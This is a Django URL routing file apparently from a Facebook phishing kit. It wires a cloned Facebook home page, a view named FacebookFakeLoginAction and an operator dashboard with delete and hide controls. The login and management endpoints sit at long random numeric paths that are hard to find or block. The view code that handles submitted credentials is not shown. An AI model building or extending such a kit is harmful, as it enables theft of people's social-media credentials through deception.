from django.urls import path
from .views import (FacebookHome,
        				   FacebookFakeLoginAction,
        				   FacebookDash,
        				   FacebookDelete,
        				   Facebookhidden,
        				   FacebookDashDel,
                   FacebookNohidden,
                   )
import random
from .config import Dasbord
r = random.randint(10000000000000000000000000, 100000000000000000000000000000000000)
r2 = random.randint(10000000000000000000000000, 100000000000000000000000000000000000)
r3 = random.randint(10000000000000000000000000, 100000000000000000000000000000000000)
r4 = random.randint(10000000000000000000000000, 100000000000000000000000000000000000)

urlpatterns = [
    path('', FacebookHome, name="home"),
    path(Dasbord(), FacebookDash, name="dash"),
    path(f"{Dasbord()}/delete", FacebookDashDel, name="fdd"),
    path(str(r), FacebookFakeLoginAction, name="ffla"),
    path(f"fremove/{str(r2)}", FacebookDelete, name="fd"),
    path(f"fhidden/{str(r3)}", Facebookhidden, name="fh"),
    path(f"fnhidden/{str(r4)}", FacebookNohidden, name="fnh"),
]
